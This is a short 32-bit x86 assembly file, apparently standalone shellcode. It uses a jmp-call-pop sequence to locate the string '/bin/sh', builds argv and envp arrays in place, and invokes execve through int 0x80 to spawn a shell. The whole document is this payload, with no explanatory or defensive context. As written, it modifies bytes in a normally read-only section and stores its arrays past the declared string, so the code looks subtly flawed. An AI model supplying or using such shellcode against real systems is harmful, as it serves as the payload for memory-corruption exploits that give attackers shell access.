BITS 32

section .text
global _start

_start:
    jmp short two

one:
    pop ebx                  ; ebx -> pointer to "/bin/sh"
    xor eax, eax
    mov [ebx + 7], al        ; Null-terminate "/bin/sh"

    ; Setup argv[] and envp[]
    mov [ebx + 8], ebx       ; argv[0] = "/bin/sh"
    mov [ebx + 12], eax      ; argv[1] = NULL
    lea ecx, [ebx + 8]       ; ecx -> argv[]
    lea edx, [ebx + 12]      ; edx -> envp[] (NULL)

    ; execve("/bin/sh", argv, envp)
    mov al, 11               ; syscall number for execve (32-bit)
    int 0x80

two:
    call one
    db "/bin/sh", 0
